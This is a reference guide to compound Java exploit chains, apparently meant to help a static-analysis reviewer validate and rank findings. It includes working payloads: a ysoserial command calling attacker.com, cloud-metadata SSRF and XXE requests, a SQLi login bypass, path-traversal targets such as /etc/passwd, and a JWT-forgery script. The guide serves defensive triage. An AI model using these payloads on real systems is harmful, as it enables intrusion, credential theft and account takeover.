# Java Attack Chain Reference — Compound Exploit Patterns & Chain Validation

## Common Chain Archetypes

### 1. Open Redirect → OAuth Token Hijack

**Primitives required:**
- Open redirect on the application (e.g., `/login?returnTo=https://evil.com`)
- OAuth flow where `redirect_uri` is derived from the `returnTo` parameter

**Chain:**
```
1. Attacker crafts: https://target.com/login?returnTo=https://attacker.com/capture
2. Victim clicks link, authenticates
3. OAuth server sends authorization code to https://attacker.com/capture
4. Attacker exchanges code for access token
5. Attacker uses token for full account takeover
```

**Evidence needed:** Confirm `returnTo` flows into `redirect_uri` parameter (check `AuthController` → `OAuthClient.authorize(redirectUri)`).

---

### 2. SSRF → Cloud Metadata → Credential Theft

**Primitives required:**
- SSRF via user-controlled URL parameter
- Application deployed on AWS/GCP/Azure

**Chain:**
```
1. Attacker sends: POST /api/webhooks {"url":"http://169.254.169.254/latest/meta-data/iam/security-credentials/role-name"}
2. Application fetches URL, returns AWS IAM temporary credentials
3. Attacker uses AccessKeyId + SecretAccessKey + Token to access S3, RDS, etc.
```

**Escalation:** If IMDSv2 is required, check whether `curl -X PUT` with `X-aws-ec2-metadata-token-ttl-seconds` header is also possible.

---

### 3. Deserialization → JNDI → LDAP Gadget Chain (RCE)

**Primitives required:**
- `ObjectInputStream.readObject()` on HTTP body
- Vulnerable gadget library on classpath (commons-collections, spring-core, etc.)

**Chain:**
```
1. Generate payload: java -jar ysoserial.jar CommonsCollections6 "curl http://attacker.com/pwned"
2. POST payload as application/octet-stream to deserialization endpoint
3. readObject() triggers InvokerTransformer → Runtime.exec() → RCE
```

---

### 4. SQLi → Auth Bypass → Admin Access

**Primitives required:**
- SQL injection in login query (e.g., `WHERE username = '...' AND password = '...'`)
- Admin functionality behind login check only

**Chain:**
```
1. Login with: username=' OR 1=1--, password=anything
2. Auth bypass — logged in as first user in DB (often admin)
3. Access admin panel: /admin/users, /admin/config
4. Impact: full application compromise
```

---

### 5. Path Traversal → Config File Read → Credential Theft

**Primitives required:**
- Path traversal in file download endpoint
- `application.properties` or `application.yml` in predictable location

**Chain:**
```
1. GET /api/files/download?name=../../WEB-INF/classes/application.properties
2. Response contains: spring.datasource.password=ProdP@ssw0rd!, jwt.secret=...
3. Use JWT secret to forge admin token → full auth bypass
4. Use DB credentials → direct database access
```

**File targets:**
```
../../WEB-INF/classes/application.properties
../../WEB-INF/classes/application-prod.yml
../../WEB-INF/web.xml
../../META-INF/MANIFEST.MF
../../../etc/passwd
../../../proc/self/environ
```

---

### 6. Hardcoded JWT Secret → Token Forgery → Admin Takeover

**Primitives required:**
- JWT secret discoverable in source (CWE-798)
- Application trusts JWT claims for authorization

**Chain:**
```python
import jwt
secret = "s3cr3t!JWT@K3y#2024"   # from JwtConfig.java:15
token = jwt.encode(
    {"sub": "1", "role": "ADMIN", "exp": 9999999999},
    secret,
    algorithm="HS256"
)
# Use token → full admin access
```

---

### 7. XXE → SSRF → Cloud Metadata

**Primitives required:**
- XXE in XML endpoint
- Application deployed on cloud with metadata endpoint

**Chain:**
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2-role">]>
<import><data>&xxe;</data></import>
```
AWS IAM credentials returned in XML response.

---

### 8. Mass Assignment → Privilege Escalation → Lateral Admin Access

**Primitives required:**
- `@RequestBody User user` bound to entity with `role` field
- Application uses `role` for authorization decisions

**Chain:**
```
1. Regular user sends: PUT /api/users/42 {"username":"alice","role":"ADMIN"}
2. User.role updated to ADMIN via mass assignment
3. User now passes @PreAuthorize("hasRole('ADMIN')") checks
4. Access all admin endpoints
```

---

## Chain Validation Checklist

Before reporting a chain as CRITICAL, verify each step:

| Step | Verification |
|------|-------------|
| Step 1 — entry point | Confirm endpoint is reachable (public or with low privilege) |
| Step 1 → 2 transition | Confirm output of step 1 flows into input of step 2 with matching types |
| Step 2 → 3 transition | Same — file and line evidence for each hop |
| Final impact | Confirm impact is concrete (RCE, credential theft, auth bypass, data exfil) |
| Same deployment | Both primitives must exist in the same codebase/deployment |
| Not theoretical | Every step must be confirmed with evidence, not assumed |

## Severity Escalation Rules

| Chain Property | Severity Adjustment |
|---------------|-------------------|
| Starts from unauthenticated entry point | Escalate to CRITICAL |
| Crosses privilege boundary (user → admin) | Escalate to CRITICAL |
| Crosses tenant boundary | Escalate to CRITICAL |
| Achieves RCE | CRITICAL regardless of auth requirement |
| Achieves credential theft (key material, JWT secret) | CRITICAL |
| Impact limited to own data only | Downgrade to HIGH or MEDIUM |
| Requires admin privileges at start | Downgrade to HIGH |
| All intermediate steps require specific conditions | Downgrade to MEDIUM |

## Chain Taint Path Documentation

```
### Example taint_path for a 3-step chain:

taint_path:
  - step: "Open redirect: returnTo parameter flows into OAuth redirect_uri"
    file: "src/main/java/com/example/AuthController.java"
    line: 78
  - step: "OAuth server sends code to attacker-controlled redirect_uri"
    file: "src/main/java/com/example/OAuthClient.java"
    line: 44
  - step: "Authorization code exchanged for access token by attacker"
    file: "n/a - external OAuth server"
    line: 0
```

Each step must have confirmed evidence. Steps marked `n/a` (external systems) must be logically necessary and documented.

## Chains to Deprioritize

| Situation | Reason |
|-----------|--------|
| One primitive requires ADMIN to exploit | Chain starts from privileged position — lower value |
| Primitives in separate microservices with no shared attack surface | Not a reachable chain |
| Second primitive is a theoretical class of vulnerability, not a confirmed finding | Insufficient evidence |
| Impact is limited to attacker's own data (IDOR on own records) | Not a meaningful escalation |
| Successful chain requires user interaction + phishing (multi-step social engineering) | Out of scope for SAST |
